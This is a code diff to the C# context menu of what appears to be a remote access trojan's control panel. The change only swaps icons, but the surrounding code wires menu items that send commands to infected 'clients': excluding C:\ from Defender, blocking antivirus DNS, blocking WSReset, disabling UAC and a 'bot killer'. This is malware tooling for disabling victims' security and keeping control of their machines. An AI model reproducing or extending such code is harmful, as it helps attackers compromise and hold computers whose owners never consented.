@@ -101,7 +101,7 @@ internal static class FeatureContextMenu
             ServerWindow.ReportGlobalActivity("Exclude C:\\", clientId, "complete");
             ServerWindow.LogGlobal(string.Format(Lang.Get("EVT_EXCLUDE_DEFENDER"), clientId));
         }));
-        misc.Items.Add(MakeItem(Lang.Get("FEAT_BLOCK_AV_DNS"), "SvgImages/Icon Builder/Security_Lock.svg", () =>
+        misc.Items.Add(MakeItem(Lang.Get("FEAT_BLOCK_AV_DNS"), "SvgImages/Icon Builder/Actions_Forbid.svg", () =>
         {
             _ = Task.Run(async () =>
             {
@@ -114,7 +114,7 @@ internal static class FeatureContextMenu
                 _ = mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal($"[ADMIN] Block AV DNS sent to {clientId}."));
             });
         }));
-        misc.Items.Add(MakeItem(Lang.Get("FEAT_BLOCK_WSRESET"), "SvgImages/Icon Builder/Security_Lock.svg", () =>
+        misc.Items.Add(MakeItem(Lang.Get("FEAT_BLOCK_WSRESET"), "SvgImages/Icon Builder/Actions_Rollback.svg", () =>
         {
             _ = Task.Run(async () =>
             {
@@ -138,7 +138,7 @@ internal static class FeatureContextMenu
             ServerWindow.LogGlobal(string.Format(Lang.Get("EVT_DISABLE_UAC"), clientId));
         }));
         misc.Items.Add(new Separator());
-        misc.Items.Add(MakeItem(Lang.Get("FEAT_BOT_KILLER"), "SvgImages/Icon Builder/Actions_Cancel.svg", () =>
+        misc.Items.Add(MakeItem(Lang.Get("FEAT_BOT_KILLER"), "SvgImages/Business Objects/BO_Skull.svg", () =>
         {
             _ = Task.Run(async () =>
             {
